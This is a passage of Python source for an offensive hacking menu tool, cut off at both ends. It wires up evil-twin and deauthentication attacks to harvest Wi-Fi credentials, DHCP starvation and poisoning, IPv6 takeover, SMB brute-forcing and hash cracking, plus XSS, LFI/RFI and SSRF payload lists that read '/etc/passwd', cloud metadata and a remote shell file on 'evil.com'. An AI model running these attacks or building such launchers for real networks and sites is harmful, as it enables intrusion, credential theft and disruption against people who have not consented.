        print("[!] DNS spoofing stopped.")
        if 'proc' in locals():
            proc.terminate()
    except Exception as e:
        print(f"[-] dnsspoof failed: {e}")

def wifi_mitm_menu():
    menu_text = """
[WiFi MITM Attacks]
1. Evil Twin AP (airbase-ng)
2. Deauth + Rogue AP (airbase-ng + deauth)
3. Automated Phishing Portal (wifiphisher)
4. Ettercap (GUI)
5. Bettercap (Full WiFi MITM)
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[WiFi MITM] Select Option > ").strip()
        if choice == "1":
            ensure_installed("airbase-ng", "aircrack-ng")
            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
            if not check_monitor_mode(iface):
                continue
            evil_twin_ap()
        elif choice == "2":
            ensure_installed("airbase-ng", "aircrack-ng")
            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
            if not check_monitor_mode(iface):
                continue
            deauth_rogue_ap()
        elif choice == "3":
            if shutil.which("wifiphisher") is None:
                print("[-] wifiphisher not found. Install with: sudo apt install wifiphisher")
                continue
            if not check_root():
                continue
            iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
            if not check_monitor_mode(iface):
                continue
            print("[!] Troubleshooting: If wifiphisher fails, ensure your interface supports monitor mode and is not blocked by rfkill.")
            try:
                subprocess.run(["sudo", "wifiphisher", "-i", iface])
            except Exception as e:
                print(f"[-] wifiphisher failed: {e}")
        elif choice == "4":
            ensure_installed("ettercap", "ettercap-graphical")
            print("[+] Launching Ettercap GUI...")
            try:
                subprocess.run(["sudo", "ettercap", "-G"])
            except Exception as e:
                print(f"[-] Ettercap GUI failed: {e}")
        elif choice == "5":
            bettercap_menu()
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def log_wifi_mitm_result(data):
    with open("results_wifi_mitm.txt", "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}\n")

def evil_twin_ap():
    ensure_installed("airbase-ng", "aircrack-ng")
    if not check_root():
        print("[-] Root privileges required for Evil Twin attack.")
        return
        
    iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
    if not iface:
        print("[-] Interface required.")
        return
        
    if not check_monitor_mode(iface):
        print(f"[-] {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
        return
        
    ssid = input("SSID to clone (target network name): ").strip()
    if not ssid:
        print("[-] SSID required.")
        return
        
    channel = input("Channel (default 6): ").strip() or "6"
    
    print("[!] This will create a fake AP with the same SSID.")
    print("[!] Clients may connect if deauthed from the real AP.")
    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface.")
    print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
    
    log_wifi_mitm_result(f"Evil Twin AP started: SSID={ssid}, channel={channel}, iface={iface}")
    
    try:
        cmd = ["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface]
        print(f"[+] Running: {' '.join(cmd)}")
        print("[*] Evil Twin AP starting... Press Ctrl+C to stop.")
        
        proc = subprocess.Popen(cmd)
        proc.wait()
    except KeyboardInterrupt:
        print("[!] Evil Twin AP stopped.")
        if 'proc' in locals():
            proc.terminate()
    except Exception as e:
        print(f"[-] airbase-ng failed: {e}")

def deauth_rogue_ap():
    ensure_installed("airbase-ng", "aircrack-ng")
    if not check_root():
        print("[-] Root privileges required for Deauth + Rogue AP attack.")
        return
        
    iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
    if not iface:
        print("[-] Interface required.")
        return
        
    if not check_monitor_mode(iface):
        print(f"[-] {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
        return
        
    ssid = input("SSID to clone (target network name): ").strip()
    if not ssid:
        print("[-] SSID required.")
        return
        
    channel = input("Channel (default 6): ").strip() or "6"
    bssid = input("Target BSSID (AP MAC): ").strip()
    if not bssid:
        print("[-] BSSID required.")
        return
        
    client = input("Target client MAC (leave blank for broadcast): ").strip()
    
    print("[!] This attack will:")
    print("  1. Deauth clients from the real AP")
    print("  2. Start a fake AP with the same SSID")
    print("  3. Capture credentials when clients reconnect")
    
    log_wifi_mitm_result(f"Deauth+Rogue AP: SSID={ssid}, channel={channel}, iface={iface}, bssid={bssid}, client={client if client else 'broadcast'}")
    
    # Start deauth attack
    print("[*] Starting deauth attack...")
    try:
        if client:
            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, iface]
        else:
            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, iface]
            
        print(f"[+] Running deauth: {' '.join(deauth_cmd)}")
        deauth_proc = subprocess.Popen(deauth_cmd)
        
        # Wait a moment for deauth to take effect
        time.sleep(3)
        
        print("[+] Now starting Evil Twin AP...")
        print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface.")
        print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
        
        # Start evil twin
        airbase_cmd = ["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface]
        print(f"[+] Running: {' '.join(airbase_cmd)}")
        
        airbase_proc = subprocess.Popen(airbase_cmd)
        airbase_proc.wait()
        
    except KeyboardInterrupt:
        print("[!] Attack stopped.")
        if 'deauth_proc' in locals():
            deauth_proc.terminate()
        if 'airbase_proc' in locals():
            airbase_proc.terminate()
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        if 'deauth_proc' in locals():
            deauth_proc.terminate()
        if 'airbase_proc' in locals():
            airbase_proc.terminate()

def wifiphisher_attack():
    ensure_installed("wifiphisher", "wifiphisher")
    print("[!] Wifiphisher automates WiFi MITM, phishing, and captive portal attacks.")
    print("[+] Launching Wifiphisher (requires root, monitor mode)...")
    log_wifi_mitm_result("Wifiphisher attack started.")
    print("[!] Wifiphisher saves captured credentials and phishing results in its output directory (shown in the tool).")
    try:
        subprocess.run(["sudo", "wifiphisher"])
    except Exception as e:
        print(f"[-] wifiphisher failed: {e}")

def osint_menu():
    menu_text = """
[OSINT Toolkit]
1. Username/Email Enumeration (Sherlock)
2. Social Media Profile Search
3. Domain/Company OSINT
4. Pastebin/Leak Search
5. OSINT Wordlist Generator
6. Generate OSINT Report
0. Back
"""
    while True:
        print_menu_no_clear(menu_text)
        choice = input("[OSINT] Select Option > ").strip()
        if choice == "1":
            sherlock_enum()
        elif choice == "2":
            social_media_search()
        elif choice == "3":
            domain_osint()
        elif choice == "4":
            pastebin_leak_search()
        elif choice == "5":
            osint_wordlist_generator()
        elif choice == "6":
            osint_report()
        elif choice == "0":
            break
        else:
            print("Invalid option.")

def sherlock_enum():
    print("[!] Username/Email Enumeration using Sherlock (if installed)")
    username = input("Username or email to search: ").strip()
    if not username:
        print("[-] No username/email provided.")
        return
    if shutil.which("sherlock"):
        print(f"[+] Running Sherlock for {username}...")
        subprocess.run(["sherlock", username])
    else:
        print("[-] Sherlock not found. Install with: pip install sherlock or git clone https://github.com/sherlock-project/sherlock")

def social_media_search():
    username = input("Username to search on social media: ").strip()
    if not username:
        print("[-] No username provided.")
        return
    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
    }
    print(f"[+] Social media profile URLs for '{username}':")
    for platform, url in platforms.items():
        print(f"  {platform}: {url}")
    print("[!] Open these links in your browser to check for existence and public info.")

def domain_osint():
    domain = input("Domain or company: ").strip()
    if not domain:
        print("[-] No domain provided.")
        return
    print(f"[+] WHOIS for {domain}:")
    whois_lookup(domain)
    print(f"[+] DNS records for {domain}:")
    dns_lookup(domain)
    print(f"[+] Subdomain scan for {domain}:")
    find_subdomains(domain)
    # Company info lookup (Clearbit API, if available)
    try:
        import requests
        clearbit_url = f"https://company.clearbit.com/v2/companies/find?domain={domain}"
        headers = {"Authorization": "Bearer CLEARBIT_API_KEY"}  # User must set their API key
        r = requests.get(clearbit_url, headers=headers)
        if r.status_code == 200:
            print(f"[+] Clearbit company info for {domain}:")
            print(r.json())
        else:
            print("[!] Clearbit info not available or API key not set.")
    except Exception:
        print("[!] Clearbit lookup skipped (requests or API key missing).")
    # HaveIBeenPwned API (better formatting)
    email = input("Check an email for breaches (optional): ").strip()
    if email:
        try:
            r = requests.get(f"https://haveibeenpwned.com/unifiedsearch/{email}")
            if r.status_code == 200 and 'No breached account' not in r.text:
                print(f"[!] Breach found for {email}!")
                print(r.text)
            else:
                print(f"[+] No breach found for {email}.")
        except Exception as e:
            print(f"[-] Error checking haveibeenpwned: {e}")

def pastebin_leak_search():
    query = input("Keyword/email/username/domain to search in public pastes: ").strip()
    if not query:
        print("[-] No query provided.")
        return
    print(f"[+] Searching public paste sites for '{query}' (basic web search)...")
    try:
        url = f"https://www.google.com/search?q=site:pastebin.com+{query}"
        print(f"[!] Open this in your browser: {url}")
    except Exception as e:
        print(f"[-] Error: {e}")

def osint_report():
    print("[+] Generating OSINT report...")
    report = []
    # Example: collect last search results (could be improved with persistent logging)
    report.append("OSINT Report - Summary\n====================\n")
    report.append("(Add your findings here as you use the toolkit!)\n")
    fname = input("Save report as (default osint_report.txt): ").strip() or "osint_report.txt"
    with open(fname, "w") as f:
        f.write("\n".join(report))
    print(f"[+] OSINT report saved as {fname}")

def advanced_xss_test():
    print("""
[Advanced XSS Testing]
- This module will test a target URL for reflected/stored XSS vulnerabilities.
- You can use automated tools (XSStrike, commix) if installed, or run basic payload tests.
""")
    url = input("Target URL (e.g. http://site.com/page?param=val): ").strip()
    if not url:
        print("[-] No URL provided.")
        return
    # Try XSStrike first
    if shutil.which("xsstrike"):
        print("[+] Running XSStrike...")
        try:
            subprocess.run(["xsstrike", "-u", url])
            log_result("xss", f"XSStrike scan: {url}")
            return
        except Exception as e:
            print(f"[-] XSStrike failed: {e}")
    # Try commix if available
    if shutil.which("commix"):
        print("[+] Running commix (for XSS and command injection)...")
        try:
            subprocess.run(["commix", "--url", url])
            log_result("xss", f"commix scan: {url}")
            return
        except Exception as e:
            print(f"[-] commix failed: {e}")
    # Fallback: simple reflected XSS test
    print("[!] Neither XSStrike nor commix found. Running basic reflected XSS test.")
    import requests
    payloads = [
        "<script>alert(1)</script>",
        "\"'><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
    ]
    found = False
    for payload in payloads:
        test_url = url.replace("=", f"={payload}", 1)
        try:
            r = requests.get(test_url, timeout=10)
            if payload in r.text:
                print(f"[VULN] Payload reflected: {payload}")
                log_result("xss", f"{test_url} reflected {payload}")
                found = True
        except Exception as e:
            print(f"[-] Error testing payload: {payload} | {e}")
    if not found:
        print("[!] No reflected XSS found with basic payloads.")

def advanced_lfi_rfi_test():
    print("""
[Advanced LFI/RFI Testing]
- This module will test a target URL/parameter for Local/Remote File Inclusion vulnerabilities.
- If LFISuite is installed, it will be used. Otherwise, basic payloads will be tested.
""")
    url = input("Target URL (e.g. http://site.com/page.php?file=home): ").strip()
    if not url or '=' not in url:
        print("[-] Please provide a URL with a parameter (e.g. ...?file=home)")
        return
    # Try LFISuite if available
    if shutil.which("lfi-suite"):
        print("[+] Running LFISuite...")
        try:
            subprocess.run(["lfi-suite", "-u", url])
            log_result("lfi", f"LFISuite scan: {url}")
            return
        except Exception as e:
            print(f"[-] LFISuite failed: {e}")
    # Fallback: basic LFI payloads
    print("[!] LFISuite not found. Running basic LFI/RFI payload tests.")
    import requests
    payloads = [
        "../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "http://evil.com/shell.txt"
    ]
    found = False
    for payload in payloads:
        test_url = url.replace("=", f"={payload}", 1)
        try:
            r = requests.get(test_url, timeout=10)
            if "root:x:" in r.text or "cGFzc3dk" in r.text or "hacked" in r.text:
                print(f"[VULN] LFI/RFI payload worked: {payload}")
                log_result("lfi", f"{test_url} reflected {payload}")
                found = True
        except Exception as e:
            print(f"[-] Error testing payload: {payload} | {e}")
    if not found:
        print("[!] No LFI/RFI found with basic payloads.")

def advanced_csrf_test():
    print("""
[Advanced CSRF Testing]
- This module will test a target URL for CSRF vulnerabilities.
- It checks for missing/weak CSRF tokens and can use OWASP ZAP or XSStrike if installed.
""")
    url = input("Target URL (e.g. http://site.com/form): ").strip()
    if not url:
        print("[-] No URL provided.")
        return
    # Try OWASP ZAP if available
    if shutil.which("zap.sh"):
        print("[+] Launching OWASP ZAP for automated CSRF scan...")
        try:
            subprocess.run(["zap.sh", "-cmd", "-quickurl", url, "-quickout", "zap_csrf_report.html", "-quickprogress"])
            print("[+] ZAP scan complete. See zap_csrf_report.html for details.")
            log_result("csrf", f"ZAP scan: {url}")
            return
        except Exception as e:
            print(f"[-] ZAP failed: {e}")
    # Try XSStrike if available
    if shutil.which("xsstrike"):
        print("[+] Running XSStrike for CSRF checks...")
        try:
            subprocess.run(["xsstrike", "-u", url, "--fuzzer", "csrf"])
            log_result("csrf", f"XSStrike CSRF scan: {url}")
            return
        except Exception as e:
            print(f"[-] XSStrike failed: {e}")
    # Fallback: basic CSRF token check
    print("[!] Neither ZAP nor XSStrike found. Running basic CSRF token check.")
    import requests
    try:
        r = requests.get(url, timeout=10)
        if any(token in r.text.lower() for token in ["csrf", "xsrf", "token"]):
            print("[+] CSRF token found in form. (Check for proper implementation)")
            log_result("csrf", f"{url} - token found")
        else:
            print("[VULN] No CSRF token found in form!")
            log_result("csrf", f"{url} - no token found")
    except Exception as e:
        print(f"[-] Error fetching form: {e}")

def advanced_web_vuln_scan():
    print("""
[Advanced Web Vulnerability Scanner]
- This module will scan a target web application for common vulnerabilities.
- Nikto and OWASP ZAP will be used if available.
""")
    url = input("Target URL (e.g. http://site.com): ").strip()
    if not url:
        print("[-] No URL provided.")
        return
    ran = False
    # Try Nikto
    if shutil.which("nikto"):
        print("[+] Running Nikto web scanner...")
        try:
            subprocess.run(["nikto", "-h", url])
            log_result("webscan", f"Nikto scan: {url}")
            ran = True
        except Exception as e:
            print(f"[-] Nikto failed: {e}")
    # Try OWASP ZAP
    if shutil.which("zap.sh"):
        print("[+] Launching OWASP ZAP for automated scan...")
        try:
            subprocess.run(["zap.sh", "-cmd", "-quickurl", url, "-quickout", "zap_webscan_report.html", "-quickprogress"])
            print("[+] ZAP scan complete. See zap_webscan_report.html for details.")
            log_result("webscan", f"ZAP scan: {url}")
            ran = True
        except Exception as e:
            print(f"[-] ZAP failed: {e}")
    if not ran:
        print("[!] Neither Nikto nor ZAP found. Please install at least one for automated web scanning.")
        print("[!] Nikto: sudo apt install nikto | ZAP: https://www.zaproxy.org/download/")

def advanced_ssrf_test():
    print("""
[Advanced SSRF Testing]
- This module will test a target URL/parameter for Server-Side Request Forgery vulnerabilities.
- If SSRFmap is installed, it will be used. Otherwise, basic payloads will be tested.
""")
    url = input("Target URL (e.g. http://site.com/page?url=...): ").strip()
    if not url or '=' not in url:
        print("[-] Please provide a URL with a parameter (e.g. ...?url=...)")
        return
    # Try SSRFmap if available
    if shutil.which("ssrfmap"):
        print("[+] Running SSRFmap...")
        try:
            subprocess.run(["ssrfmap", "-u", url])
            log_result("ssrf", f"SSRFmap scan: {url}")
            return
        except Exception as e:
            print(f"[-] SSRFmap failed: {e}")
    # Fallback: basic SSRF payloads
    print("[!] SSRFmap not found. Running basic SSRF payload tests.")
    import requests
    payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://evil.com/ssrf"
    ]
    found = False
    for payload in payloads:
        test_url = url.replace("=", f"={payload}", 1)
        try:
            r = requests.get(test_url, timeout=10)
            if any(x in r.text for x in ["root:x:", "meta-data", "ssrf"]):
                print(f"[VULN] SSRF payload worked: {payload}")
                log_result("ssrf", f"{test_url} reflected {payload}")
                found = True
        except Exception as e:
            print(f"[-] Error testing payload: {payload} | {e}")
    if not found:
        print("[!] No SSRF found with basic payloads.")

def advanced_smb_bruteforce():
    print("""
[Advanced SMB/NTLM/LDAP Brute-force]
- This module will brute-force SMB/NTLM/LDAP logins on a target.
- CrackMapExec or Medusa will be used if available.
""")
    target = input("Target IP/hostname: ").strip()
    username = input("Username (or path to userlist): ").strip()
    wordlist = input("Password wordlist (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    if not target or not username or not wordlist:
        print("[-] Please provide all required fields.")
        return
    ran = False
    # Try CrackMapExec
    if shutil.which("crackmapexec"):
        print("[+] Running CrackMapExec (SMB)...")
        try:
            subprocess.run(["crackmapexec", "smb", target, "-u", username, "-p", wordlist])
            log_result("smb_brute", f"CME SMB: {target} {username} {wordlist}")
            ran = True
        except Exception as e:
            print(f"[-] CrackMapExec failed: {e}")
    # Try Medusa
    if shutil.which("medusa"):
        print("[+] Running Medusa (SMB)...")
        try:
            subprocess.run(["medusa", "-h", target, "-u", username, "-P", wordlist, "-M", "smbnt"])
            log_result("smb_brute", f"Medusa SMB: {target} {username} {wordlist}")
            ran = True
        except Exception as e:
            print(f"[-] Medusa failed: {e}")
    if not ran:
        print("[!] Neither CrackMapExec nor Medusa found. Please install at least one for SMB brute-force.")
        print("[!] CrackMapExec: pip install crackmapexec | Medusa: sudo apt install medusa")

def advanced_hashdump_crack():
    print("""
[Advanced Hashdump & Offline Password Cracking]
- This module will attempt to crack password hashes using John the Ripper or Hashcat.
- You must provide a file containing hashes (e.g. /etc/shadow, NTLM, etc.).
""")
    hashfile = input("Path to hash file: ").strip()
    if not hashfile or not os.path.exists(hashfile):
        print("[-] Hash file not found.")
        return
    wordlist = input("Wordlist (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    ran = False
    # Try John the Ripper
    if shutil.which("john"):
        print("[+] Running John the Ripper...")
        try:
            subprocess.run(["john", "--wordlist", wordlist, hashfile])
            subprocess.run(["john", "--show", hashfile])
            log_result("hashcrack", f"John: {hashfile} {wordlist}")
            ran = True
        except Exception as e:
            print(f"[-] John failed: {e}")
    # Try Hashcat
    if shutil.which("hashcat"):
        print("[+] Running Hashcat...")
        hashmode = input("Hashcat mode (e.g. 0 for MD5, 1000 for NTLM, 1800 for sha512crypt, see --help): ").strip()
        if not hashmode:
            print("[-] No hash mode provided for Hashcat.")
        else:
            try:
                subprocess.run(["hashcat", "-m", hashmode, hashfile, wordlist, "--force"])
                log_result("hashcrack", f"Hashcat: {hashfile} {wordlist} mode {hashmode}")
                ran = True
            except Exception as e:
                print(f"[-] Hashcat failed: {e}")
    if not ran:
        print("[!] Neither John the Ripper nor Hashcat found. Please install at least one for hash cracking.")
        print("[!] John: sudo apt install john | Hashcat: sudo apt install hashcat")

def advanced_dhcp_attack():
    print("""
[Advanced DHCP Starvation/Poisoning]
- This module will perform DHCP starvation or poisoning attacks on the local network.
- Yersinia or dhcpstarv will be used if available.
""")
    print("1. DHCP Starvation (exhaust IP pool)")
    print("2. DHCP Poisoning (rogue server)")
    print("0. Cancel")
    choice = input("Select attack type: ").strip()
    if choice == "0":
        return
    ran = False
    if choice == "1":
        # Try dhcpstarv
        if shutil.which("dhcpstarv"):
            print("[+] Running dhcpstarv for DHCP starvation...")
            try:
                subprocess.run(["dhcpstarv"])
                log_result("dhcp", "dhcpstarv starvation attack")
                ran = True
            except Exception as e:
                print(f"[-] dhcpstarv failed: {e}")
        # Try Yersinia
        elif shutil.which("yersinia"):
            print("[+] Running Yersinia (GUI, select DHCP module)...")
            try:
                subprocess.run(["yersinia", "-G"])
                log_result("dhcp", "Yersinia starvation attack")
                ran = True
            except Exception as e:
                print(f"[-] Yersinia failed: {e}")
    elif choice == "2":
        # Try Yersinia
        if shutil.which("yersinia"):
            print("[+] Running Yersinia (GUI, select DHCP module for poisoning)...")
            try:
                subprocess.run(["yersinia", "-G"])
                log_result("dhcp", "Yersinia poisoning attack")
                ran = True
            except Exception as e:
                print(f"[-] Yersinia failed: {e}")
        else:
            print("[-] No supported tool found for DHCP poisoning. Install Yersinia.")
    else:
        print("Invalid choice.")
    if not ran:
        print("[!] Neither Yersinia nor dhcpstarv found. Please install at least one for DHCP attacks.")
        print("[!] Yersinia: sudo apt install yersinia | dhcpstarv: https://github.com/kleo/dhcpstarv")

def advanced_snmp_enum():
    print("""
[Advanced SNMP Enumeration]
- This module will enumerate SNMP information from a target device.
- snmpwalk and onesixtyone will be used if available.
""")
    target = input("Target IP/hostname: ").strip()
    community = input("Community string (default 'public'): ").strip() or "public"
    if not target:
        print("[-] No target provided.")
        return
    ran = False
    # Try snmpwalk
    if shutil.which("snmpwalk"):
        print(f"[+] Running snmpwalk on {target} with community '{community}'...")
        try:
            subprocess.run(["snmpwalk", "-v2c", "-c", community, target])
            log_result("snmp_enum", f"snmpwalk: {target} {community}")
            ran = True
        except Exception as e:
            print(f"[-] snmpwalk failed: {e}")
    # Try onesixtyone
    if shutil.which("onesixtyone"):
        print(f"[+] Running onesixtyone on {target} with community '{community}'...")
        try:
            subprocess.run(["onesixtyone", "-c", community, target])
            log_result("snmp_enum", f"onesixtyone: {target} {community}")
            ran = True
        except Exception as e:
            print(f"[-] onesixtyone failed: {e}")
    if not ran:
        print("[!] Neither snmpwalk nor onesixtyone found. Please install at least one for SNMP enumeration.")
        print("[!] snmpwalk: sudo apt install snmp | onesixtyone: sudo apt install onesixtyone")

def advanced_ipv6_attacks():
    print("""
[Advanced IPv6 Attacks]
- This module will perform common IPv6 network attacks (RA spoofing, MITM6, etc.).
- mitm6 and THC-IPv6 tools will be used if available.
""")
    print("1. MITM6 (Windows IPv6 takeover)")
    print("2. THC-IPv6 Toolkit (choose attack)")
    print("0. Cancel")
    choice = input("Select attack type: ").strip()
    if choice == "0":
        return
    ran = False
    if choice == "1":
        if shutil.which("mitm6"):
            print("[+] Running mitm6 (requires root)...")
            try:
                subprocess.run(["sudo", "mitm6"])
                log_result("ipv6", "mitm6 attack")
                ran = True
            except Exception as e:
                print(f"[-] mitm6 failed: {e}")
        else:
            print("[-] mitm6 not found. Install with: pip install mitm6")
    elif choice == "2":
        if shutil.which("fake_router6"):
            print("[+] THC-IPv6 toolkit found. Example: fake_router6 eth0")
            iface = input("Interface (e.g. eth0): ").strip()
            if iface:
                try:
                    subprocess.run(["sudo", "fake_router6", iface])
                    log_result("ipv6", f"THC-IPv6 fake_router6 {iface}")
                    ran = True
                except Exception as e:
                    print(f"[-] fake_router6 failed: {e}")
            else:
                print("[-] No interface provided.")
        else:
            print("[-] THC-IPv6 tools not found. Install with: sudo apt install thc-ipv6")
    else:
        print("Invalid choice.")
    if not ran:
        print("[!] No supported IPv6 attack tool found. Please install mitm6 or THC-IPv6.")
        print("[!] mitm6: pip install mitm6 | THC-IPv6: sudo apt install thc-ipv6")

# --- END ADVANCED ATTACK MODULES ---

# Wrapper functions for core menu options
def arp_scan_wrapper():
    print("[+] ARP Scan - Find live hosts on local network")
    print("[!] This requires sudo privileges.")
    safe_press_enter("Press Enter to continue...")
    arp_scan()
    safe_press_enter("\n[Press Enter to return to the menu]")

def port_scan_wrapper():
    print("[+] Port Scan - Scan target for open ports")
    target = safe_input("Target IP/hostname: ")
    if target is None:
        return
    if not target.strip():
        print("[-] Target required.")
        return
    target = target.strip()
    port_scan(target)
    safe_press_enter("\n[Press Enter to return to the menu]")

def whois_wrapper():
    print("[+] Whois Lookup - Get domain registration info")
    domain = safe_input("Domain: ")
    if domain is None:
        return
    if not domain.strip():
        print("[-] Domain required.")
        return
    domain = domain.strip()
    whois_lookup(domain)
    safe_press_enter("\n[Press Enter to return to the menu]")

def headers_wrapper():
    print("[+] HTTP Headers - Get HTTP response headers")
    url = input("URL (http/https): ").strip()
    if not url:
        print("[-] URL required.")
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    headers_grabber(url)
    input("\n[Press Enter to return to the menu]")

def crack_hash_wrapper():
    print("[+] Crack SHA256 Hash - Attempt to crack password hash")
    hash_input = input("SHA256 hash: ").strip()
    if not hash_input:
        print("[-] Hash required.")
        return
    if len(hash_input) != 64:
        print("[-] Invalid SHA256 hash length. Should be 64 characters.")
        return
    crack_hash(hash_input)
    input("\n[Press Enter to return to the menu]")

def dns_wrapper():
    print("[+] DNS Lookup - Get DNS records for domain")
    domain = input("Domain: ").strip()
    if not domain:
        print("[-] Domain required.")
        return
    dns_lookup(domain)
    input("\n[Press Enter to return to the menu]")

def ssl_wrapper():
    print("[+] SSL Certificate Info - Get SSL certificate details")
    domain = input("Domain (no http): ").strip()
    if not domain:
        print("[-] Domain required.")
        return
    ssl_info(domain)
    input("\n[Press Enter to return to the menu]")

def subdomain_wrapper():
    print("[+] Subdomain Finder - Find subdomains of target domain")
    domain = input("Domain: ").strip()
    if not domain:
        print("[-] Domain required.")
        return
    find_subdomains(domain)
    input("\n[Press Enter to return to the menu]")

def dir_brute_wrapper():
    print("[+] Directory Bruteforce - Find hidden directories")
    url = input("Base URL (http/https): ").strip()
    if not url:
        print("[-] URL required.")
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    dir_bruteforce(url)
    input("\n[Press Enter to return to the menu]")

def cve_wrapper():
    print("[+] CVE Search - Search for vulnerabilities")
    keyword = input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): ").strip()
    if not keyword:
        print("[-] Keyword or CVE ID required.")
        return
    cve_lookup(keyword)
    input("\n[Press Enter to return to the menu]")

# Advanced wrapper functions for options 11-30
def gobuster_wrapper():
    print("[+] Gobuster Directory Scan - Advanced web directory enumeration")
    print("[!] This tool will find hidden directories and files on web servers.")
    url = input("Target URL (http/https): ").strip()
    if not url:
        print("[-] URL required.")
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print("[!] Choose scan type:")
    print("1. Quick scan (common directories)")
    print("2. Full scan (large wordlist)")
    print("3. Custom wordlist")
    print("4. File extensions scan")
    
    choice = input("Select scan type (1-4, default 1): ").strip() or "1"
    
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    extensions = ""
    
    if choice == "1":
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        print("[+] Quick scan with common directories")
    elif choice == "2":
        wordlist = "/usr/share/wordlists/dirb/big.txt"
        print("[+] Full scan with large wordlist")
    elif choice == "3":
        wordlist = input("Custom wordlist path: ").strip()
        if not wordlist or not os.path.exists(wordlist):
            print("[-] Wordlist not found. Using default.")
            wordlist = "/usr/share/wordlists/dirb/common.txt"
    elif choice == "4":
        extensions = input("File extensions (e.g. php,html,txt): ").strip()
        if extensions:
            extensions = f"-x {extensions}"
        print(f"[+] File extension scan: {extensions}")
    else:
        print("[-] Invalid choice. Using quick scan.")
    
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        print("[!] Installing wordlists...")
        subprocess.run(["sudo", "apt", "install", "-y", "dirb"])
        if not os.path.exists(wordlist):
            print("[-] Could not find wordlist. Using basic scan.")
            wordlist = "/usr/share/wordlists/dirb/common.txt"
    
    print(f"[+] Starting Gobuster scan on {url}")
    print(f"[+] Wordlist: {wordlist}")
    
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-t", "50"]
    if extensions:
        cmd.extend(extensions.split())
    
    try:
        print(f"[+] Running: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        if proc.stdout is not None:
            for line in proc.stdout:
                print(line, end='')
        proc.wait()
        print("[+] Gobuster scan completed.")
    except Exception as e:
        print(f"[-] Gobuster failed: {e}")
    
    input("\n[Press Enter to return to the menu]")

def nmap_advanced_wrapper():
    print("[+] Nmap Advanced Scan - Professional network reconnaissance")
    print("[!] This is a comprehensive network scanning tool.")
    target = input("Target IP/hostname/network: ").strip()
    if not target:
        print("[-] Target required.")
        return
    
    print("[!] Choose scan profile:")
    print("1. Stealth scan (SYN scan, no ping)")
    print("2. Aggressive scan (OS detection, version detection)")
    print("3. Vulnerability scan (NSE scripts)")
    print("4. Full port scan (all 65535 ports)")
    print("5. Custom scan")
    
    choice = input("Select scan profile (1-5, default 1): ").strip() or "1"
    
    if choice == "1":
        options = "-sS -Pn -T4 --top-ports 1000"
        print("[+] Stealth SYN scan (no ping, top 1000 ports)")
    elif choice == "2":
        options = "-sS -sV -O -A -T4"
        print("[+] Aggressive scan (OS/version detection)")
    elif choice == "3":
        options = "-sS -sV --script=vuln -T4"
        print("[+] Vulnerability scan with NSE scripts")
    elif choice == "4":
        options = "-sS -p- -T4"
        print("[+] Full port scan (all 65535 ports)")
    elif choice == "5":
        options = input("Custom Nmap options: ").strip()
        if not options:
            options = "-sS -A -T4"
    else:
        options = "-sS -Pn -T4 --top-ports 1000"
    
    output_file = f"nmap_scan_{target.replace('/', '_')}.txt"
    
    print(f"[+] Starting Nmap scan on {target}")
    print(f"[+] Options: {options}")
    print(f"[+] Output: {output_file}")
    
    cmd = ["nmap"] + options.split() + [target, "-oN", output_file]
    
    try:
        print(f"[+] Running: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        proc.wait()
        print(f"[+] Nmap scan completed. Results saved to {output_file}")
        
        # Show summary
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                content = f.read()
                open_ports = [line for line in content.split('\n') if 'open' in line]
                if open_ports:
                    print(f"\n[+] Found {len(open_ports)} open ports:")
                    for port in open_ports[:10]:  # Show first 10
                        print(f"  {port}")
                    if len(open_ports) > 10:
                        print(f"  ... and {len(open_ports) - 10} more")
    except Exception as e:
        print(f"[-] Nmap failed: {e}")
    
    input("\n[Press Enter to return to the menu]")

def hydra_advanced_wrapper():
    print("[+] Hydra Advanced Brute Force - Professional password cracking")
    print("[!] This tool will attempt to crack login credentials.")
    
    target = input("Target IP/hostname: ").strip()
    if not target:
        print("[-] Target required.")
        return
    
